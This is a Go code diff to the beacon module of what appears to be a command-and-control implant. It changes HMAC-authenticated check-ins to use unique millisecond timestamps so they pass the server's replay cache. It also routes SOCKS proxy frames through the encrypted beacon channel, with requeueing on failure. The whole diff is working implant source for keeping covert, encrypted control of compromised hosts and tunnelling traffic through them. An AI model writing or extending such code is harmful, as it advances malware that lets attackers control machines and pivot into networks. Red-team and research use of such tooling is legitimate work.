@@ -173,7 +173,9 @@ func (b *Beacon) register() error {
 		username = u.Username
 	}
 
-	now := time.Now().Unix()
+	// Share the same unique-ms generator as beacons so register+first beacon
+	// cannot collide in the server ReplayCache within one millisecond.
+	now := b.nextBeaconTimestamp()
 	hmac := zcrypto.ComputeHMAC(b.config.Secret, b.config.ImplantID, now)
 
 	reg := &pb.Register{
@@ -215,11 +217,11 @@ func (b *Beacon) register() error {
 	return nil
 }
 
-// nextBeaconTimestamp returns a unique unix-second timestamp for HMAC auth.
-// Rapid back-to-back beacons (result flush) must not reuse the same second or
+// nextBeaconTimestamp returns a unique Unix-millisecond timestamp for HMAC auth.
+// Sub-second beacons (low sleep / result flush) must not reuse the same value or
 // the server ReplayCache rejects them as replays.
 func (b *Beacon) nextBeaconTimestamp() int64 {
-	ts := time.Now().Unix()
+	ts := time.Now().UnixMilli()
 	if ts <= b.lastBeaconTs {
 		ts = b.lastBeaconTs + 1
 	}
@@ -238,16 +240,19 @@ func (b *Beacon) sendResults(results []*pb.TaskResult) *pb.BeaconResponse {
 		Hmac:      hmac,
 	}
 
-	if b.sessionKey != nil && len(results) > 0 {
-		payload := &pb.BeaconResultsPayload{Results: results}
+	socksFrames := tasks.DrainSocksFrames()
+	if b.sessionKey != nil && (len(results) > 0 || len(socksFrames) > 0) {
+		payload := &pb.BeaconResultsPayload{Results: results, SocksFrames: socksFrames}
 		plaintext, err := proto.Marshal(payload)
 		if err != nil {
 			log.Printf("[implant] marshal results payload error: %v", err)
+			tasks.RequeueSocksFrames(socksFrames)
 			return nil
 		}
 		encrypted, err := zcrypto.AESEncrypt(b.sessionKey, plaintext)
 		if err != nil {
 			log.Printf("[implant] encrypt results error: %v", err)
+			tasks.RequeueSocksFrames(socksFrames)
 			return nil
 		}
 		beacon.EncryptedResults = encrypted
@@ -258,6 +263,9 @@ func (b *Beacon) sendResults(results []*pb.TaskResult) *pb.BeaconResponse {
 	resp, err := b.transport.Beacon(beacon)
 	if err != nil {
 		log.Printf("[implant] beacon error: %v", err)
+		// Transport failed after drain — put SOCKS frames back for retry.
+		// Task results remain in pendingResults at the caller.
+		tasks.RequeueSocksFrames(socksFrames)
 		return nil
 	}
 	return resp
@@ -281,6 +289,9 @@ func (b *Beacon) decryptTasks(resp *pb.BeaconResponse) []*pb.Task {
 	if err := proto.Unmarshal(plaintext, payload); err != nil {
 		log.Printf("[implant] unmarshal decrypted tasks error: %v", err)
 		return nil
+	}
+	if len(payload.SocksFrames) > 0 {
+		tasks.HandleSocksFrames(payload.SocksFrames)
 	}
 	return payload.Tasks
 }
